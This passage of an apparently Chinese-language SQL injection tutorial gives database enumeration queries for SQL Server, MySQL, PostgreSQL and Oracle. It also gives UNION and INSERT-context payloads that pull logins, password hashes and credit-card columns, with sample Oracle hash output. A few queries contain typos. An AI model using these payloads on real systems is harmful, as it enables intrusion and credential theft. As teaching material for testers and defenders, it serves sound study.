<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>syscolumns <span class="token keyword">WHERE</span> id <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> name <span class="token operator">=</span> <span class="token string">'customers'</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这句SQL用的是镶嵌查询，先用里面的查出customers表的id，再通过id指定表查列名，也能使用连接查询</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> a<span class="token punctuation">.</span>name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>syscolumns a<span class="token punctuation">,</span>e_shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects b <span class="token keyword">WHERE</span>
b<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'customers'</span> <span class="token operator">AND</span> a<span class="token punctuation">.</span>id <span class="token operator">=</span> b<span class="token punctuation">.</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>知道了列名，可以开始枚举字段，爆数据了，数据类型的检验前面说过</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test?id=12+union+select+null,login,password, null+from+e-shop..Customers-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>防暴力破解scrypt算法</p>
<h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><p>提取数据库名称, 然后转向表、列，最后是数据本身。</p>
<p>检索用户</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> current_users<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>没有管理员权限，大于5.0的版本能用information_schema，获取数据库名列表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">schema</span> form information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举表名，库名customers_db</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'customers_db'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举所有表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>检索列</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name<span class="token operator">=</span><span class="token string">'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>全部列</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样就可以爆出数据库全部内容，当然你能加一些限制条件，找到你需要的数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> column_name <span class="token operator">LIKE</span> <span class="token string">'password'</span> <span class="token operator">OR</span> column_name <span class="token operator">LIKE</span> <span class="token string">'credit_card'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查询用户授权信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> grantee<span class="token punctuation">,</span>privilege_type<span class="token punctuation">,</span>is_grantable <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>5.0之前的数据库</p>
<p>先访问存储目标数据库的文件，将其原始内容导入到我们创建的一张表中，然后使用前面介绍的技术提取该表。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>数据库的文件保存在与数据库名称相同的目录下。此目录包含在主MySQL数据目录中，可使用下列查询来返回该目录：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> @<span class="token variable">@datadir</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>数据库的所有表包含在一个扩展名为MYD的文件中。例如，下面是数据库默认的 一些MYD文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tables_priv.MYD
host.MYD
help_keyword.MYD
columns_priv.MYD
db.MYD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可使用下列查询提取该数据库中特定表的内容：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> load_file<span class="token punctuation">(</span><span class="token string">'databasename/tablename.MYD'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>要是没有information_schema,就必须先暴力破解表名后才能成功执行该查询。load_file允许检索的字节数有个最大值，该值由<code>@@max_allowed_packet</code> 变量指定。所以该技术不适用于存储了大量数据的表。</p>
<h4 id="PostgreSQL-1"><a href="#PostgreSQL-1" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>检索所有数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> datname <span class="token keyword">FROM</span> pg_database<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查找当前数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> current_database<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>检索数据库用户列表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> usename <span class="token keyword">from</span> pg_user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查询当前用户</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token keyword">current_user</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token keyword">session_user</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>session_user返回启动当前数据库连接的用户，而current_user和user(二者是等价的)则返回当前执行上下文的用户，即返回用于检查许可权限的那个用户账号。除非在某处调用了 SET ROLE指令，否则二者通常返回相同的值。对于最后一条语句，getpgusername()将返回与当前线程关联的用户。</p>
<p>枚举所有模式中的全部表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> c<span class="token punctuation">.</span>relname <span class="token keyword">FROM</span> pg_catalog<span class="token punctuation">.</span>pg_class c <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> pg_catalog<span class="token punctuation">.</span>pg_namespace n <span class="token keyword">ON</span> n<span class="token punctuation">.</span>oid <span class="token operator">=</span> c<span class="token punctuation">.</span>relnamespace <span class="token keyword">WHERE</span> c<span class="token punctuation">.</span>relkind <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">AND</span> n<span class="token punctuation">.</span>nspname <span class="token operator">NOT</span> <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'pg_catalog'</span><span class="token punctuation">,</span> <span class="token string">'pg_toast'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> pg_catalog<span class="token punctuation">.</span>pg_table_is_visible<span class="token punctuation">(</span>c<span class="token punctuation">.</span>oid<span class="token punctuation">)</span>

<span class="token keyword">SELECT</span> tablename <span class="token keyword">FROM</span> pg_tables <span class="token keyword">WHERE</span> tablename <span class="token operator">NOT</span> <span class="token operator">LIKE</span> <span class="token string">'pg_%'</span> <span class="token operator">AND</span> tablename <span class="token operator">NOT</span> <span class="token operator">LIKE</span> <span class="token string">'sql_%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>所有列(public下的)</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> relname<span class="token punctuation">,</span>A<span class="token punctuation">.</span>attname <span class="token keyword">FROM</span> pg_class C<span class="token punctuation">,</span>pg_namespace N<span class="token punctuation">,</span>pg_attribute A<span class="token punctuation">,</span>pg_type T <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>C<span class="token punctuation">.</span>relkind<span class="token operator">=</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>oid<span class="token operator">=</span>C<span class="token punctuation">.</span>relnamespace<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attrelid<span class="token operator">=</span>C<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>atttypid<span class="token operator">=</span>T<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attnum<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token operator">NOT</span> A<span class="token punctuation">.</span>attisdropped<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>nspname <span class="token operator">ILIKE</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>passwd列</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> relname<span class="token punctuation">,</span>A<span class="token punctuation">.</span>attname <span class="token keyword">FROM</span> pg_class C<span class="token punctuation">,</span>pg_namespace N<span class="token punctuation">,</span>pg_attribute A<span class="token punctuation">,</span>pg_type T <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>C<span class="token punctuation">.</span>relkind<span class="token operator">=</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>oid<span class="token operator">=</span>C<span class="token punctuation">.</span>relnamespace<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attrelid<span class="token operator">=</span>C<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>atttypid<span class="token operator">=</span>T<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attnum<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token operator">NOT</span> A<span class="token punctuation">.</span>attisdropped<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>nspname <span class="token operator">ILIKE</span> <span class="token string">'public'</span><span class="token punctuation">)</span> <span class="token operator">AND</span>
attname <span class="token operator">LIKE</span> <span class="token string">'%passwd%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p>无法枚举存在的数据库</p>
<p>枚举所有属于当前用户的表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> user_tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举所有表和表的拥有者</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> owner<span class="token punctuation">,</span>table_name <span class="token keyword">from</span> all_tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举更多关于应用表的信息以确定表中出现的列数和行数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a<span class="token punctuation">.</span>table_name<span class="token operator">||</span><span class="token string">'['</span><span class="token operator">||</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">']='</span><span class="token operator">||</span>num_rows <span class="token keyword">from</span> user_tab_columns a<span class="token punctuation">,</span>user_tables b <span class="token keyword">where</span> a<span class="token punctuation">.</span>table_name<span class="token operator">=</span>b<span class="token punctuation">.</span>table_name <span class="token keyword">group</span> <span class="token keyword">by</span>
a<span class="token punctuation">.</span>table_name<span class="token punctuation">,</span>num_rows

EMP<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">14</span>
<span class="token keyword">DUMMY</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>
DEPT<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">4</span>
SALGRADE<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为所有可访问或可用的表枚举相同的信息，包括用户、表名以及表中包含的行数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> b<span class="token punctuation">.</span>owner<span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span>a<span class="token punctuation">.</span>table_name<span class="token operator">||</span><span class="token string">'['</span><span class="token operator">||</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">']='</span><span class="token operator">||</span>num_rows <span class="token keyword">from</span> all_tab_columns a<span class="token punctuation">,</span>all_tables b <span class="token keyword">where</span> a<span class="token punctuation">.</span>table_name<span class="token operator">=</span>b<span class="token punctuation">.</span>table_name <span class="token keyword">group</span> <span class="token keyword">by</span> b<span class="token punctuation">.</span>owner<span class="token punctuation">,</span>a<span class="token punctuation">.</span>table_name<span class="token punctuation">,</span>num_rows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举每张表的列和数据类型以便更完整地了解数据库模式</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>column_name<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>data_type<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>column_id <span class="token keyword">from</span> user_tab_columns <span class="token keyword">order</span> <span class="token keyword">by</span> table_name<span class="token punctuation">,</span>column_id

DEPT:DEPTNO:NUMBER:<span class="token number">1</span>
DEPT:DNAME:VARCHAR2:<span class="token number">2</span>
DEPT:LOC:VARCHAR2:<span class="token number">3</span>
<span class="token keyword">DUMMY</span>:<span class="token keyword">DUMMY</span>:NUMBER:<span class="token number">1</span>
EMP:EMPNO:NUMBER:<span class="token number">1</span>
EMP:ENAME:VARCHAR2:<span class="token number">2</span>
EMP:JOB:VARCHAR2:<span class="token number">3</span>
EMP:MGR:NUMBER:<span class="token number">4</span>
EMP:HIREDATE:<span class="token keyword">DATE</span>:<span class="token number">5</span>
EMP:SAL:NUMBER:<span class="token number">6</span>
EMP:COMM:NUMBER:<span class="token number">7</span>
EMP:DEPTNO:NUMBER:<span class="token number">8</span>
SALGRADE:GRADE:NUMBER:<span class="token number">1</span>
SALGRADE:LOSAL:NUMBER:<span class="token number">2</span>
SALGRADE:HISAL:NUMBER:<span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>返回当前数据库用户权限</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 获取当前用户的系统权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_sys_privs<span class="token punctuation">;</span><span class="token comment">-- how system privileges of the current user</span>
<span class="token comment">-- 获取当前用户的角色权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_role_privs<span class="token punctuation">;</span><span class="token comment">-- show role privileges of the current user</span>
<span class="token comment">-- 获取当前用户的表格权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_tab_privs<span class="token punctuation">;</span>
<span class="token comment">-- 获取当前用户的列权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_col_privs<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取所有可能的权限列表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 获取所有系统权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_sys_privs<span class="token punctuation">;</span>
<span class="token comment">-- 获取所有角色权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_role_privs<span class="token punctuation">;</span>
<span class="token comment">-- 获取所有表权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_tab_privs<span class="token punctuation">;</span>
<span class="token comment">-- 获取所有列权限：</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_col_privs<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>返回数据库中所有用户的列表，默认任意数据库用户可执行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span>created <span class="token keyword">from</span> all_users <span class="token keyword">order</span> <span class="token keyword">by</span> created <span class="token keyword">desc</span><span class="token punctuation">;</span>

SCOTT	<span class="token number">04</span>	<span class="token operator">-</span>JAN <span class="token operator">-</span>	<span class="token number">09</span>
PHP	<span class="token number">04</span>	<span class="token operator">-</span>JAN <span class="token operator">-</span>	<span class="token number">09</span>
PLSQL	<span class="token number">02</span>	<span class="token operator">-</span>JAN <span class="token operator">-</span>	<span class="token number">09</span>
MONODEMO	<span class="token number">29</span>	<span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span>	<span class="token number">08</span>
DEMO1	<span class="token number">29</span>	<span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span>	<span class="token number">08</span>
ALEX	<span class="token number">14</span>	<span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span>	<span class="token number">08</span>
OWBSYS	<span class="token number">13</span>	<span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span>	<span class="token number">08</span>
FLOWS_030000	<span class="token number">13</span>	<span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span>	<span class="token number">08</span>
APEX <span class="token keyword">PUBLIC</span> <span class="token keyword">USER</span>	<span class="token number">13</span>	<span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span>	<span class="token number">08</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在Oracle 10g R2之后的版本中，普通用户可使用下列SELECT语句检索数据库的用户名和哈希口令</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span> password<span class="token punctuation">,</span> astatus <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 and length(password)=16 </span>
<span class="token comment">-- astatus (0=open, 9=locked&amp; expired)</span>

SYS     AD24A888FC3B1BE7 <span class="token number">0</span>
SYSTEM  BD3D49AD69E3FA34 <span class="token number">0</span>
OUTLN   <span class="token number">4</span>A3BA55E08595081 <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Oracle llg中，Oracle已经修改了所使用口令的哈希算法，而且哈希口令位于另外 一个不同的列中（spare4列），如下所示：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span>spare4 <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 and length(spare4)=62 </span>

SYS
S:<span class="token number">1336</span>FB26ACF58354164952E502B4F726FF8B5D382012D2E7B1EC99C426A7
SYSTEM
S:<span class="token number">38968</span>E8CEC12026112B0010BCBA3ECC2FD278AFA17AE363FDD74674F2651<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>高级用户，找到加密内容的表，都加密了一定会有可利用的</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">table</span> name<span class="token punctuation">,</span><span class="token keyword">column</span> name<span class="token punctuation">,</span>encryption_alg<span class="token punctuation">,</span>salt <span class="token keyword">from</span> dba_encrypted_columns<span class="token punctuation">;</span> 

<span class="token keyword">TABLE</span> NAME       <span class="token keyword">COLUMN</span> NAME    ENCRYPTION ALG       SALT CREDITCARD		CCNR          AES256              <span class="token keyword">NO</span>
CREDITCARD		  CVE           AES256              <span class="token keyword">NO</span>
CREDITCARD        VALID          AES256              <span class="token keyword">NO</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>检索数据库存在哪些DBA账户</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> grantee<span class="token punctuation">,</span>granted_role<span class="token punctuation">,</span>admin_option<span class="token punctuation">,</span>default_role <span class="token keyword">from</span> dba_role_privs <span class="token keyword">where</span> granted_role<span class="token operator">=</span><span class="token string">'DBA'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="在INSERT查询中实施注入攻击"><a href="#在INSERT查询中实施注入攻击" class="headerlink" title="在INSERT查询中实施注入攻击"></a>在INSERT查询中实施注入攻击</h3><p>更新数据后执行注入查询语句，update，delete一个意思</p>
<h4 id="第一种情形：插入用户规定的数据"><a href="#第一种情形：插入用户规定的数据" class="headerlink" title="第一种情形：插入用户规定的数据"></a>第一种情形：插入用户规定的数据</h4><h5 id="插入的不是最后一列"><a href="#插入的不是最后一列" class="headerlink" title="插入的不是最后一列"></a>插入的不是最后一列</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 插入模板</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'sql'</span><span class="token punctuation">,</span><span class="token string">'notsql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>插入第一列，构造SQL代码关闭<code>sql</code>，再构建我们需要查询的第二列，注释掉其他部分</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'sql'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> name <span class="token operator">+</span> <span class="token string">' | '</span> <span class="token operator">+</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sql_logins<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- ','notsql')</span>

<span class="token comment">-- fn_varbintohexstr将二进制的哈希值转换为十六进制格式</span>

<span class="token comment">-- http://test/?sql=sql',(SELECT TOP 1 name + ' | ' + master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))-- &amp;notsql=notsql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="插入的是最后一列"><a href="#插入的是最后一列" class="headerlink" title="插入的是最后一列"></a>插入的是最后一列</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 插入模板</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span> col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'notsql'</span><span class="token punctuation">,</span><span class="token string">'sql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在mysql中只有处于ANSI模式(或者任何实现了 PIPES_AS_QUOTES的其他模式，比如DB2、ORACLE或MAXDB)，管道符才会被解析成连接符。然而，一般都是未实现PIPES_AS_QUOTES(比如处于TRADITIONAL模式)，那么||操作符将被解析为一个OR逻辑操作符，而不是一个连接操作符。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> CONCAT<span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> @@ version<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>利用整数与字符相加，优先显示数字的特性</p>
